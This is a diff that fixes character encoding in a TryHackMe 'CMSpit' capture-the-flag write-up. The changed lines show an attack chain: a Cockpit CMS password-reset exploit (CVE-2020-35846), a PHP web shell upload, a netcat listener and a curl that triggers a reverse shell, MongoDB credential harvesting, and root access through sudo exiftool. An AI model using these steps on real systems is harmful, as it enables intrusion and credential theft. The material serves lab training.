@@ -1,4 +1,4 @@
-﻿# CMSpit Â— TryHackMe Writeup
+# CMSpit A TryHackMe Writeup
 
 **Target:** `TARGET_IP` (10.129.180.199 at time of solve)
 **OS:** Linux (Ubuntu 16.04)
@@ -11,23 +11,23 @@
 ## Attack Chain Overview
 
 ```
-nmap ? 22, 80 (Apache 2.4.18)
-    ?
-curl /package.json ? "version": "0.11.1" (Cockpit CMS, vulnerable)
-    ?
-ExploitDB 50185 (CVE-2020-35846) ? enumerate users + reset admin password
-    ?
-Cockpit admin ? upload shell.php in Assets ? /storage/uploads/.../<hash>shell.php
-    ?
-Reverse shell as www-data ? user.txt
-    ?
-find / -name "*.sqlite" 2>/dev/null ? cockpit*.sqlite (no creds inside)
-    ?
-mongo ? use sudousersbak; db.user.find() ? stux : p4ssw0rdhack3d!123
-    ?
-su stux ? sudo -l ? (root) NOPASSWD: /usr/bin/exiftool *
-    ?
-sudo exiftool -filename=/home/stux/root.txt /root/root.txt ? root flag
+nmap -> 22, 80 (Apache 2.4.18)
+    |
+curl /package.json -> "version": "0.11.1" (Cockpit CMS, vulnerable)
+    |
+ExploitDB 50185 (CVE-2020-35846) -> enumerate users + reset admin password
+    |
+Cockpit admin -> upload shell.php in Assets -> /storage/uploads/.../<hash>shell.php
+    |
+Reverse shell as www-data -> user.txt
+    |
+find / -name "*.sqlite" 2>/dev/null -> cockpit*.sqlite (no creds inside)
+    |
+mongo -> use sudousersbak; db.user.find() -> stux : p4ssw0rdhack3d!123
+    |
+su stux -> sudo -l -> (root) NOPASSWD: /usr/bin/exiftool *
+    |
+sudo exiftool -filename=/home/stux/root.txt /root/root.txt -> root flag
 ```
 
 ---
@@ -93,7 +93,7 @@ Full technique: [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.m
 # Why here: enumerate valid usernames and reset the admin password to regain control of the CMS.
 python3 enumeration.py http://$TARGET
 # [+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
-# (interactive prompt ? reset admin's password to NEW_PASS)
+# (interactive prompt -> reset admin's password to NEW_PASS)
 ```
 
 ### 3b. Login + upload `shell.php`
@@ -116,7 +116,7 @@ nc -lvnp 4444
 # What it does: trigger the uploaded PHP shell.
 # Why here: execute the bash reverse shell payload and land the www-data foothold.
 curl http://$TARGET/storage/uploads/2026/04/29/69f24f45d48fbshell.php
-# whoami ? www-data
+# whoami -> www-data
 ```
 
 Stabilise:
@@ -169,7 +169,7 @@ admin     0.000GB
 cockpitdb 0.012GB
 config    0.000GB
 local     0.000GB
-sudousersbak 0.000GB           ? unusual name
+sudousersbak 0.000GB           -> unusual name
 
 > use sudousersbak
 > show collections
@@ -220,17 +220,17 @@ cat /home/stux/root.txt
 
 ## 7. Key Takeaways
 
-- Always pull `/package.json` / `/composer.json` from any PHP CMS Â— the version string is one curl away from a known-CVE pivot.
+- Always pull `/package.json` / `/composer.json` from any PHP CMS — the version string is one curl away from a known-CVE pivot.
 - Cockpit CMS = 0.11.1 chain is the canonical NoSQL-injection-into-reset pattern. The same idea applies to any app that forwards JSON straight into Mongo's `findOne()`.
 - Cockpit / similar CMSs serve uploads under `/storage/uploads/...` and execute `.php` from there by default. Asset upload + direct-link click = RCE.
 - A box with a CMS almost always runs the CMS's own DB on `127.0.0.1`. After landing the `www-data` shell, `find / -name "*.db" -o -name "*.sqlite"` and `ss -tlnp | grep -E '27017|3306|5432|6379'` are mandatory next steps.
-- `sudo` rules naming `exiftool`, `vim`, `awk`, `find`, `tar`, `zip`, `git` are GTFOBins-class Â— `sudo -l` is always the start of the privesc check.
+- `sudo` rules naming `exiftool`, `vim`, `awk`, `find`, `tar`, `zip`, `git` are GTFOBins-class — `sudo -l` is always the start of the privesc check.
 
 ---
 
 ## Related Notes
-- [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.md) Â— initial access
-- [mongodb-enumeration.md](../../../techniques/creds/mongodb-enumeration.md) Â— user pivot
-- [exiftool-sudo-cve-2021-22204.md](../../../privesc/linux/exiftool-sudo-cve-2021-22204.md) Â— root privesc
-- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) Â— playbook backbone
+- [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.md) — initial access
+- [mongodb-enumeration.md](../../../techniques/creds/mongodb-enumeration.md) — user pivot
+- [exiftool-sudo-cve-2021-22204.md](../../../privesc/linux/exiftool-sudo-cve-2021-22204.md) — root privesc
+- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) — playbook backbone
 - [nmap](../../../tools/recon/nmap.md), [curl](../../../tools/web/curl.md), [searchsploit](../../../tools/recon/searchsploit.md), [netcat](../../../tools/pivot/netcat.md), [mongo](../../../tools/database/mongo.md), [exiftool](../../../tools/web/exiftool.md)
